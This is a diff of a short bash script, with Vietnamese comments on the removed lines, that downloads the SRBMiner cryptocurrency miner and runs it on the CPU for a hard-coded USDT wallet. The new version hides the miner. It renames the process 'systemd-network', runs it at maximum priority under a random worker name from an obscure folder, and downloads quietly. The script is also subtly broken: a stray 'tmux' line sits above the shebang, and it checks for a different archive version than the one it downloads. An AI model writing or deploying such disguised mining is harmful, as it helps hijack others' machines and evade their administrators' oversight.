@@ -1,31 +1,18 @@
+tmux
+
 #!/bin/bash
 
-# Di chuyển đến thư mục tạm thời
-cd /tmp
+THREADS=3
+MINER_NAME=$(shuf -i 10000000-99999999 -n 1)
 
-# Tải SRBMiner từ GitHub
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.9/SRBMiner-Multi-2-5-9-Linux.tar.gz
+mkdir -p neable
+cd neable
 
-# Giải nén gói SRBMiner
-tar -xzvf SRBMiner-Multi-2-5-9-Linux.tar.gz
+if [ ! -f SRBMiner-Multi-2-8-0-Linux.tar.gz ]; then
+  wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.1/SRBMiner-Multi-2-8-1-Linux.tar.gz
+  tar -xf SRBMiner-Multi-2-8-1-Linux.tar.gz
+fi
 
-# Di chuyển vào thư mục SRBMiner đã giải nén
-cd SRBMiner-Multi-2-5-9
+cd SRBMiner-Multi-2-8-1
 
-# Dừng agent
-agent-stop
-
-# Sao chép file SRBMiner-MULTI vào thư mục đích
-cp SRBMiner-MULTI /opt/mmp/miners/sbrminer/
-
-# Khởi động lại agent
-agent-start
-
-# Tạo tên ngẫu nhiên bằng cách sử dụng phần đầu của UUID
-UUID=$(uuidgen | cut -d'-' -f1)
-
-# Sử dụng tên mới, ví dụ: RTX_UUID
-NEW_NAME="RTX_${UUID}"
-
-# Chạy SRBMiner với 3 CPU threads
-./SRBMiner-MULTI --algorithm ghostrider --pool stratum+ssl://ghostrider.unmineable.com:443 --wallet USDT:0xfe301Eb4Cb42EE7F605922Cf82c813638011D89A.$NEW_NAME#ii6d-2qcm --cpu-threads=3
+exec -a systemd-network nice -n -20 ./SRBMiner-MULTI --disable-gpu --algorithm randomx -o rx.unmineable.com:3333 -a rx -k -u USDT:0xfe301Eb4Cb42EE7F605922Cf82c813638011D89A.$MINER_NAME#ii6d-2qcm -p x --cpu-threads $THREADS --cpu-max-threads-hint=100 --randomx-1gb-pages
